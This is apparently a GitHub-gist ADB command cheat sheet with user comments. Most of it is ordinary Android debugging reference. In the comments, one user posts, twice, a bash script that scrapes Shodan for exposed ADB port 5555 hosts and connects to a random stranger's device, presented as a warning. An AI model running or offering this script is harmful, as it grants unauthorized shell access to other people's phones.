# ADB (almost) Full Commands List

## ADB (almost) Full Commands List

adb help // List all commands

### Adb Server

adb kill-server adb start-server

### Adb Reboot

adb reboot adb reboot recovery adb reboot-bootloader adb root //restarts adb with root permissions

### Shell

adb shell // Open or run commands in a terminal on the host Android device.

### Devices

adb usb adb devices //show devices attached adb devices -l //devices (product/model) adb connect ip\_address\_of\_device

### Get device android version

adb shell getprop ro.build.version.release

### LogCat

adb logcat adb logcat -c // clear // The parameter -c will clear the current logs on the device. adb logcat -d > \[path\_to\_file] // Save the logcat output to a file on the local system. adb bugreport > \[path\_to\_file] // Will dump the whole device information like dumpstate, dumpsys and logcat output.

### Files

adb push \[source] \[destination] // Copy files from your computer to your phone. adb pull \[device file location] \[local file location] // Copy files from your phone to your computer.

### App install

adb -e install path/to/app.apk

* d - directs command to the only connected USB device… -e - directs command to the only running emulator… -s

… -p … The flag you decide to use has to come before the actual adb command:

adb devices | tail -n +2 | cut -sf 1 | xargs -IX adb -s X install -r com.myAppPackage // Install the given app on all connected devices.

### Uninstalling app from device

adb uninstall com.myAppPackage adb uninstall \<app .apk name> adb uninstall -k \<app .apk name> -> “Uninstall .apk withour deleting data”

adb shell pm uninstall com.example.MyApp adb shell pm clear \[package] // Deletes all data associated with a package.

adb devices | tail -n +2 | cut -sf 1 | xargs -IX adb -s X uninstall com.myAppPackage //Uninstall the given app from all connected devices

### == Update app

adb install -r yourApp.apk // -r means re-install the app and keep its data on the device. adb install –k <.apk file path on computer>

### == Home button

adb shell am start -W -c android.intent.category.HOME -a android.intent.action.MAIN

### == Activity Manager

adb shell am start -a android.intent.action.VIEW adb shell am broadcast -a ‘my\_action’

adb shell am start -a android.intent.action.CALL -d tel:+972527300294 // Make a call

// Open send sms screen with phone number and the message: adb shell am start -a android.intent.action.SENDTO -d sms:+972527300294 –es sms\_body "Test –ez exit\_on\_sent false

// Reset permissions adb shell pm reset-permissions -p your.app.package adb shell pm grant \[packageName] \[ Permission] // Grant a permission to an app. adb shell pm revoke \[packageName] \[ Permission] // Revoke a permission from an app.

// Emulate device adb shell wm size 2048x1536 adb shell wm density 288 // And reset to default adb shell wm size reset adb shell wm density reset

### == Print text

adb shell input text ‘Wow, it so cool feature’

### == Screenshot

adb shell screencap -p /sdcard/screenshot.png

$ adb shell shell@ $ screencap /sdcard/screen.png shell@ $ exit $ adb pull /sdcard/screen.png

122 –> “KEYCODE\_MOVE\_HOME” 123 –> “KEYCODE\_MOVE\_END” // [https://developer.android.com/reference/android/view/KeyEvent.html](https://developer.android.com/reference/android/view/KeyEvent.html)

### == ShPref

* replace org.example.app with your application id
* Add a value to default shared preferences. adb shell ‘am broadcast -a org.example.app.sp.PUT –es key key\_name –es value “hello world!”’
* Remove a value to default shared preferences. adb shell ‘am broadcast -a org.example.app.sp.REMOVE –es key key\_name’
* Clear all default shared preferences. adb shell ‘am broadcast -a org.example.app.sp.CLEAR –es key key\_name’
* It’s also possible to specify shared preferences file. adb shell ‘am broadcast -a org.example.app.sp.PUT –es name Game –es key level –ei value 10’
* Data types adb shell ‘am broadcast -a org.example.app.sp.PUT –es key string –es value “hello world!”’ adb shell ‘am broadcast -a org.example.app.sp.PUT –es key boolean –ez value true’ adb shell ‘am broadcast -a org.example.app.sp.PUT –es key float –ef value 3.14159’ adb shell ‘am broadcast -a org.example.app.sp.PUT –es key int –ei value 2015’ adb shell ‘am broadcast -a org.example.app.sp.PUT –es key long –el value 9223372036854775807’
* Restart application process after making changes adb shell ‘am broadcast -a org.example.app.sp.CLEAR –ez restart true’

### == Monkey

adb shell monkey -p com.myAppPackage -v 10000 -s 100 // monkey tool is generating 10.000 random events on the real device

### == Paths

/data/data//databases (app databases) /data/data//shared\_prefs/ (shared preferences) /data/app (apk installed by user) /system/app (pre-installed APK files) /mmt/asec (encrypted apps) (App2SD) /mmt/emmc (internal SD Card) /mmt/adcard (external/Internal SD Card) /mmt/adcard/external\_sd (external SD Card)

adb shell ls (list directory contents) adb shell ls -s (print size of each file) adb shell ls -R (list subdirectories recursively)

### == Device onformation

adb get-statе (print device state) adb get-serialno (get the serial number) adb shell dumpsys iphonesybinfo (get the IMEI) adb shell netstat (list TCP connectivity) adb shell pwd (print current working directory) adb shell dumpsys battery (battery status) adb shell pm list features (list phone features) adb shell service list (list all services) adb shell dumpsys activity / (activity info) adb shell ps (print process status) adb shell wm size (displays the current screen resolution) dumpsys window windows | grep -E ‘mCurrentFocus|mFocusedApp’ (print current app’s opened activity)

### == Package info

adb shell list packages (list package names) adb shell list packages -r (list package name + path to apks) adb shell list packages -3 (list third party package names) adb shell list packages -s (list only system packages) adb shell list packages -u (list package names + uninstalled) adb shell dumpsys package packages (list info on all apps) adb shell dump (list info on one package) adb shell path (path to the apk file)

### ==Configure Settings Commands

adb shell dumpsys battery set level (change the level from 0 to 100) adb shell dumpsys battery set status (change the level to unknown, charging, discharging, not charging or full) adb shell dumpsys battery reset (reset the battery) adb shell dumpsys battery set usb (change the status of USB connection. ON or OFF) adb shell wm size WxH (sets the resolution to WxH)

### == Device Related Commands

adb reboot-recovery (reboot device into recovery mode) adb reboot fastboot (reboot device into recovery mode) adb shell screencap -p “/path/to/screenshot.png” (capture screenshot) adb shell screenrecord “/path/to/record.mp4” (record device screen) adb backup -apk -all -f backup.ab (backup settings and apps) adb backup -apk -shared -all -f backup.ab (backup settings, apps and shared storage) adb backup -apk -nosystem -all -f backup.ab (backup only non-system apps) adb restore backup.ab (restore a previous backup) adb shell am start|startservice|broadcast \[] -a e.g. android.intent.action.VIEW -c e.g. android.intent.category.LAUNCHER (start activity intent)

adb shell am start -a android.intent.action.VIEW -d URL (open URL) adb shell am start -t image/\* -a android.intent.action.VIEW (opens gallery)

### == Logs

adb logcat \[options] \[filter] \[filter] (view device log) adb bugreport (print bug reports)

### == Other

adb backup // Create a full backup of your phone and save to the computer. adb restore // Restore a backup to your phone. adb sideload // Push and flash custom ROMs and zips from your computer.

fastboot devices // Check connection and get basic information about devices connected to the computer. // This is essentially the same command as adb devices from earlier. //However, it works in the bootloader, which ADB does not. Handy for ensuring that you have properly established a connection.

Shared Preferences

***

#### replace org.example.app with your application id

***

#### Add a value to default shared preferences. adb shell ‘am broadcast -a org.example.app.sp.PUT –es key key\_name –es value “hello world!”’

***

#### Remove a value to default shared preferences. adb shell ‘am broadcast -a org.example.app.sp.REMOVE –es key key\_name’

***

#### Clear all default shared preferences. adb shell ‘am broadcast -a org.example.app.sp.CLEAR –es key key\_name’

***

#### It’s also possible to specify shared preferences file. adb shell ‘am broadcast -a org.example.app.sp.PUT –es name Game –es key level –ei value 10’

***

#### Data types adb shell ‘am broadcast -a org.example.app.sp.PUT –es key string –es value “hello world!”’ adb shell ‘am broadcast -a org.example.app.sp.PUT –es key boolean –ez value true’ adb shell ‘am broadcast -a org.example.app.sp.PUT –es key float –ef value 3.14159’ adb shell ‘am broadcast -a org.example.app.sp.PUT –es key int –ei value 2015’ adb shell ‘am broadcast -a org.example.app.sp.PUT –es key long –el value 9223372036854775807’

***

#### Restart application process after making changes adb shell ‘am broadcast -a org.example.app.sp.CLEAR –ez restart true’

***

### === Few bash snippets ===

@Source ([https://jonfhancock.com/bash-your-way-to-better-android-development-1169bc3e0424](https://jonfhancock.com/bash-your-way-to-better-android-development-1169bc3e0424))

### === Using tail -n

//Use tail to remove the first line. Actually two lines. The first one is just a newline. The second is “List of devices attached.” $ adb devices | tail -n +2

### === Using cut -sf

// Cut the last word and any white space off the end of each line. $ adb devices | tail -n +2 | cut -sf -1

### === Using xargs -I

// Given the -I option, xargs will perform an action for each line of text that we feed into it. // We can give the line a variable name to use in commands that xargs can execute. $ adb devices | tail -n +2 | cut -sf -1 | xargs -I X echo X aw yiss

### === Three options below together

// Will print android version of all connected devices adb devices | tail -n +2 | cut -sf -1 | xargs -I X adb -s X shell getprop ro.build.version.release

### === Using alias

– Example 1 alias tellMeMore=echo tellMeMore “hi there” Output => hi there – Example 2 // Define alias alias apkinstall=“adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X install -r $1” // And you can use it later apkinstall \~/Downloads/MyAppRelease.apk // Install an apk on all devices – Example 3 alias rmapp=“adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X uninstall $1” rmapp com.example.myapp // Uninstall a package from all devices – Example 4 alias clearapp=“adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X shell pm clear $1” clearapp com.example.myapp // Clear data on all devices (leave installed) – Example 5 alias startintent=“adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X shell am start $1” startintent [https://twitter.com/JonFHancock](https://twitter.com/JonFHancock) // Launch a deep link on all devices

Setting up your .bash\_profile Finally, to make this all reusable even after rebooting your computer (aliases only last through the current session), we have to add these to your .bash\_profile. You might or might not already have a .bash\_profile, so let’s make sure we append to it rather than overwriting it. Just open a terminal, and run the following command

touch .bash\_profile && open .bash\_profile

This will create it if it doesn’t already exist, and open it in a text editor either way. Now just copy and paste all of the aliases into it, save, and close.

alias startintent=“adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X shell am start $1” alias apkinstall=“adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X install -r $1” alias rmapp=“adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X uninstall $1” alias clearapp=“adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X shell pm clear $1”

\=============================================================== ### Sources: \~ Internet \~ [https://www.automatetheplanet.com/adb-cheat-sheet/](https://www.automatetheplanet.com/adb-cheat-sheet/)

#### Comments and questions (and some answers):

@hotdang-ca hotdang-ca commented on May 16, 2022 @Basu-max likely not with the adb binary. I could imagine a scenario where you wrote a console program that proxies through to adb but only supported a restricted list of functions…

@Basu-max Basu-max commented on May 16, 2022 @Basu-max likely not with the adb binary. I could imagine a scenario where you wrote a console program that proxies through to adb but only supported a restricted list of functions…

Thanks for the reply. Right. Specially I was wondering if it is possible to configure the ADB demon to remove/disable modules that remove/disable specific CMDs. This would prevent a proxy program. Objective is to secure ADB by restricting to a pre configured ADM CMD list. Adding a proxy program to mask CMDs while ADB present would not meet the objective.

@hotdang-ca hotdang-ca commented on May 17, 2022 adb would, indeed, not meet the objective. In fact, you’ll need developer mode turned on at the device to even connect, so this may not be the solution you are looking for.

Depending on the nature of the command, you could also remove / disable the command while you are in the system through adb. It is a linux system, after all.

@ArthurSav ArthurSav commented on May 30, 2022 • Just wanted to share this command to force-stop all user installed apps:

If you’re running from within the emulator pm list packages -3 | awk -F “package:” ‘{print $2}’ | xargs -n1 am force-stop

If you’re running via adb: adb shell pm list packages -3 | awk -F “package:” ‘{print $2}’ | xargs -n1 adb shell am force-stop

@spot5694 spot5694 commented on Jun 14, 2022 Hello, Is there any command that adds a google account?

@delbotRo delbotRo commented on Jun 17, 2022 Hi, I was wondering if anyone knows command do disable “Raise to wake” option on Redmi 9. I disabled it in settings but it still keep waking up as soon as I lift it. It’s killing me. Thanks

@MrDjBird MrDjBird commented on Jun 19, 2022 • Thanks, I doing adb module for python with this

@shahrukhjaved786 shahrukhjaved786 commented on Jun 19, 2022 Thanks, I doing adb module for python with this

@MrDjBird hi, could you pl be little more specific about it, I didn’t get actually what exactly about python / adb module

@Miltonbhowmick Miltonbhowmick commented on Jul 28, 2022 • How to use & in adb shell input text ‘asdas&’? I am trying to insert a text which contains &. But it is not working. Note: %, $, #, ‘@’ etc. special characters are working well except ^, & characters in text value for adb input.

@OlenaO OlenaO commented on Aug 17, 2022 Hi, I was wondering if anyone knows the command do disable auto update the app

@wuseman wuseman commented on Aug 20, 2022 • Hi, I was wondering if anyone knows the command do disable auto update the app

Package wise adb shell pm disable-user –user 0 Stop auto-update for all apps adb shell pm disable-user com.android.vending @wuseman wuseman commented on Aug 20, 2022 How to use & in adb shell input text ‘asdas&’? I am trying to insert a text which contains &. But it is not working. Note: %, $, #, ‘@’ etc. special characters are working well except ^, & characters in text value for adb input.

adb shell input text ‘foo&’ adb shell input text ‘foo^’ adb shell input text ‘foo&^’ adb shell input text ‘foo&^’ adb shell echo Hello “&” World adb shell echo Hello & World On Older Devices the below command probably works fine as well adb shell input keyevent KEYCODE\_AMPERSAND @HeadStudios HeadStudios commented on Aug 20, 2022 Yeh but… how do you connect to Android shell as it doesn’t give name as IP address when you do adb devices so you can’t just use that right? Can’t find that information but I was doing it before?

@wuseman wuseman commented on Aug 20, 2022 • You need to connect to your device via adb connect adb connect : First you need to enable tcp mode as below with usb cable connected Plugin USB and execute adb tcpip 5555 Remove USB Cable and connect to your device via network: adb connect :5555 Now you can work with your device via network, enter shell as usual: adb shell warning WARNING: \*Don’t forget to DISCONNECT when you have finished debugging. You can be in danger and may be listed at [shodan.io](http://shodan.io/) and other sites similiar to shodan if you will keep tcpip be running in background. We can find your device via a simple portscan via masscan or similiar tools, so use below command when you are done in shell:

adb disconnect To show you the danger with keep tcp mode running, for more tips to stay safe you can visit the below url for get latest commands since some are out of date I see here: [https://wuseman.github.io/adb-cheatsheet/](https://wuseman.github.io/adb-cheatsheet/)

You can copy and paste in any terminal and you are connected to a random device that has tcpip running without device owners knowledge, there is no way to figure out wihtout list connected devices ON the device. Therefore, take my warning seriously! Within \~1-3 seconds you have connected to a device. Now imagine if we use xargs -n1 -P20, then we connect to 20 device at same time. So be careful!!

## Port for ABD

PORT=“5555”

## Shodan FILTER:

FILTER=“android+debug+bridge”

## Source URL:

TARGETS=“[https://www.shodan.io/search?query=${FILTER}”](https://www.shodan.io/search?query=$%7BFILTER%7D%E2%80%9D)

function findTargets() { curl -sL ${TARGETS}|awk ‘!seen\[$0]++’

|grep -E -o “(\[0-9]{1,3}\[.]){3}\[0-9]{1,3}”

|awk ‘!seen\[$0]++’ |tee wadb-attack.log }

function adbConnect() { grep -E -o “(\[0-9]{1,3}\[.]){3}\[0-9]{1,3}” wadb-attack.log

|sed ‘s/$/:5555/g’|tee target.txt shuf -n1 target.txt

|xargs adb connect }

findTargets adbConnect Above script is shared for educational purposes, wuseman cannot be held responsible for other users’ use of the above script // wuseman

@HeadStudios HeadStudios commented on Aug 21, 2022 You need to connect to your device via adb connect adb connect : First you need to enable tcp mode as below with usb cable connected Plugin USB and execute adb tcpip 5555 Remove USB Cable and connect to your device via network: adb connect :5555 Now you can work with your device via network, enter shell as usual: adb shell warning WARNING: \*Don’t forget to DISCONNECT when you have finished debugging. You can be in danger and may be listed at [shodan.io](http://shodan.io/) and other sites similiar to shodan if you will keep tcpip be running in background. We can find your device via a simple portscan via masscan or similiar tools, so use below command when you are done in shell:

adb disconnect To show you the danger with keep tcp mode running, for more tips to stay safe you can visit the below url for get latest commands since some are out of date I see here: [https://wuseman.github.io/adb-cheatsheet/](https://wuseman.github.io/adb-cheatsheet/)

You can copy and paste in any terminal and you are connected to a random device that has tcpip running without device owners knowledge, there is no way to figure outwihtout list connected devices ON the device. Therefore, take my warning seriously! Within \~1-3 seconds you have connected to a device. Now imagine if we use xargs -n1 -P20, then we connect to 20 device at same time. So be careful!!

## Port for ABD

PORT=“5555”

## Shodan FILTER:

FILTER=“android+debug+bridge”

## Source URL:

TARGETS=“[https://www.shodan.io/search?query=${FILTER}”](https://www.shodan.io/search?query=$%7BFILTER%7D%E2%80%9D)

function findTargets() { curl -sL ${TARGETS}|awk ‘!seen\[$0]++’

|grep -E -o “(\[0-9]{1,3}\[.]){3}\[0-9]{1,3}”

|awk ‘!seen\[$0]++’ |tee wadb-attack.log }

function adbConnect() { grep -E -o “(\[0-9]{1,3}\[.]){3}\[0-9]{1,3}” wadb-attack.log

|sed ‘s/$/:5555/g’|tee target.txt shuf -n1 target.txt

|xargs adb connect }

findTargets adbConnect Above script is shared for educational purposes, wuseman cannot be held responsible for other users’ use of the below script // wuseman

Wow thank you so much! I was using adb shell but i’ll keep disconnect in mind for protection (I do put my laptop to sleep and can keep shell open for a long time so it’s good to know the dangers..)

@muhammedbasilek muhammedbasilek commented on Oct 18, 2022 Hi, How can I turn on airplane mode using adb commands !! I had tried many commands, but it actually only changing the icon, it is not turning off radio signal !!

@wuseman wuseman commented on Oct 18, 2022 Hi, How can I turn on airplane mode using adb commands !! I had tried many commands, but it actually only changing the icon, it is not turning off radio signal !!

Hi.

Interesting find.

Does the icon become brighter than usual when you use the command via adb in notification center for airplane\_mode @muhammedbasilek ?

@muhammedbasilek muhammedbasilek commented on Oct 18, 2022 Hi, How can I turn on airplane mode using adb commands !! I had tried many commands, but it actually only changing the icon, it is not turning off radio signal !!

Hi.

Interesting find.

Does the icon become brighter than usual when you use the command via adb in notification center for airplane\_mode @muhammedbasilek ?

No, it slightly dim when it turns on.

@wuseman wuseman commented on Nov 12, 2022 @muhammedbasilek

Hi again, I finally I figured this out, please try:

Get airplane mode adb shell cmd connectivity airplane-mode

disabled Turn airplane mode enable/disable adb shell cmd connectivity airplane-mode enable

adb shell cmd connectivity airplane-mode disable @muhammedbasilek muhammedbasilek commented on Nov 14, 2022 • @wuseman

Sorry it is still not working !! Tested on OnePlus10T 5G.

@wuseman wuseman commented on Nov 14, 2022 • @wuseman

Sorry it is still not working !! Tested on OnePlus10T 5G.

You must provide a little more information otherwise it is difficult to help.

Did: adb shell cmd connectivity airplane-mode - work or did you get any error message? If command was did you try:

adb shell cmd connectivity airplane-mode enable ..If the command was

adb shell cmd connectivity airplane-mode Was the value changed in shell?

Which Android version do you have installed? @muhammedbasilek muhammedbasilek commented on Nov 17, 2022 @wuseman Sorry it is still not working !! Tested on OnePlus10T 5G.

You must provide a little more information otherwise it is difficult to help.

Did: adb shell cmd connectivity airplane-mode - work or did you get any error message? If command was OK did you try:

adb shell cmd connectivity airplane-mode enable ..If the command was valid

adb shell cmd connectivity airplane-mode Was the value changed in shell?

Which Android version do you have installed? Hi, Thank you so much for the effort. Actually it is working now. Used above command. adb shell cmd connectivity airplane-mode enable Thanks again !!

@wuseman wuseman commented on Nov 18, 2022 Cool, I thought it was a bit strange otherwise. You welcome, cheers :)

@Gillinghammer Gillinghammer commented on Jan 18 Occasionally screencap stops working, producing a 0 filesize png file instead of one with data. Right now the only way I can resolve this is by rebooting the device, but wondering if it’s possible to restart this screencap service via adb shell somehow?

@wuseman wuseman commented on Jan 20 Occasionally screencap stops working, producing a 0 filesize png file instead of one with data. Right now the only way I can resolve this is by rebooting the device, but wondering if it’s possible to restart this screencap service via adb shell somehow?

What command are you using when you using screencap and it gives you a 0 byte file?

@Gillinghammer Gillinghammer commented on Jan 20 adb shell screencap > screen.png

I’ve got a loop that fires that command once per second.

Works at first but after a few minutes of my script running the screen captures start coming in broken.

@wuseman wuseman commented on Jan 20 Ok, I just tried and it seems to works fine for one capture at least.

Try this inside your script:

adb exec-out screencap -p > screen.png @Gillinghammer Gillinghammer commented on Jan 20 via email Yeah that works for me as well. It’s just my script looping so fast it seems to crash the screencap process somehow.

The only way I’ve found so far is to reboot the system to get screencap working again.

Was hoping that I could just send a shell command to restart the specific service instead.

Something like adb shell screencap\_service restart … @wuseman wuseman commented on Jan 21 • I see, if you would show us your script or the function for your screencap we probably can give you better support.

You want to take a screencap every second or what are you trying when it wont take captures anymore?

You running this in a while loop without delay?

@Gillinghammer Gillinghammer commented on Jan 21 I’m doing this in a while loop with a half-second delay. It will work for a few minutes and then ultimately the image file is corrupted and my script crashes, so I force a reboot on the device.

while run: try: loop += 1 print(‘loop count’, loop) image to memory im\_b64 = device1.exec\_out(‘screencap -p | base64’) im\_bytes = base64.b64decode(im\_b64) im\_file = BytesIO(im\_bytes) image = Image.open(im\_file) # crop image image1 = image.crop((1520, 860, 1920, 980)) # left top right bottom im = numpy.asarray(image1) # extract text from image text = pytesseract.image\_to\_string(im) print(text) if “Skip” in text: device1.shell(‘input tap 1640 950’) print(“Skip clicked!”) [logging.info](http://logging.info/)(“Commercial Skipped”) if loop > 1800: # each loop is about 1s so 1800 is 30 minutes run = False [logging.info](http://logging.info/)(“Skipper stopping after 30 minutes”) time.sleep(0.5) except Exception as e: print(e) run = False logging.error(‘App Crashed:’ + e) # error with android device, reboot to fix device1.reboot()
